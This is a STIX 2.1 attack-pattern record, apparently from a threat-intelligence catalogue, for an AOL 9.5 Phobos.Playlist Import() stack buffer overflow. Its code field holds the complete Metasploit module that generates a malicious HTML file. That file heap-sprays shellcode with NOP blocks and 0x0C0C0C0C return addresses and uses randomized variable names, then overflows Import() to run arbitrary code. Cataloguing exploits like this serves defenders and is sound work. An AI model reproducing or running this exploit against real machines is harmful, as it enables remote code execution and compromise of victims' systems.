{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc6d3e1c-94e6-4bea-9ff8-08bcc18085b9",
    "created": "2024-08-14T16:38:14.197041Z",
    "modified": "2024-08-14T16:38:14.197045Z",
    "name": "AOL 9.5 Phobos.Playlist Import() Stack-based Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow within Phobos.dll of AOL 9.5. By setting an overly long value to 'Import()', an attacker can overrun a buffer and execute arbitrary code.  NOTE: This ActiveX control is NOT marked safe for scripting or initialization.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/aol_phobos_bof.rb",
            "external_id": "aol_phobos_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.rec-sec.com/2010/01/25/aol-playlist-class-buffer-overflow/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# aol_phobos_bof.rb\n#\n# AOL 9.5 Phobos.Playlist 'Import()' Stack-based Buffer Overflow exploit for the Metasploit Framework\n#\n# Tested successfully on the following platforms:\n#  - AOL 9.5 (Revision 4337.155) on Internet Explorer 7, Windows XP SP3\n#\n# Phobos.dll version tested:\n# File Version: 9.5.0.1\n# ClassID: A105BD70-BF56-4D10-BC91-41C88321F47C\n# RegKey Safe for Script: False\n# RegKey Safe for Init: False\n# Implements IObjectSafety: False\n# KillBitSet: False\n#\n# Due to the safe for initialization and safe for scripting settings of this ActiveX control,\n# exploitation is possible only from Local Machine Zone, which means the victim must run the\n# generated exploit file locally.\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AOL 9.5 Phobos.Playlist Import() Stack-based Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow within Phobos.dll of AOL 9.5.\n        By setting an overly long value to 'Import()', an attacker can overrun a buffer\n        and execute arbitrary code.\n\n        NOTE: This ActiveX control is NOT marked safe for scripting or initialization.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Trancer <mtrancer[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '61964'],\n          [ 'EDB', '11204' ],\n          [ 'URL', 'http://www.rec-sec.com/2010/01/25/aol-playlist-class-buffer-overflow/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C, 'Offset' => 1000 } ]\n        ],\n      'DisclosureDate' => '2010-01-20',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME',   [ false, 'The file name.',  'msf.html']),\n        ])\n  end\n\n  def exploit\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('L'))\n    blocksize = 0x40000\n    fillto    = 500\n    offset \t  = target['Offset']\n\n    # Randomize the javascript variable names\n    phobos       = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    j_bla        = rand_text_alpha(rand(8) + 4)\n\n    html = %Q|<html>\n<object classid='clsid:A105BD70-BF56-4D10-BC91-41C88321F47C' id='#{phobos}'></object>\n<script>\n#{j_shellcode}=unescape('#{shellcode}');\n#{j_nops}=unescape('#{nops}');\n#{j_headersize}=20;\n#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\nwhile(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\nwhile(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n#{j_memory}=new Array();\nfor(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n\nvar #{j_ret}='';\nfor(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');\n#{phobos}.Import(#{j_ret},'#{j_bla}','True','True');\n</script>\n</html>|\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(html)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-20",
    "x_mitre_platforms": [
        "win'"
    ]
}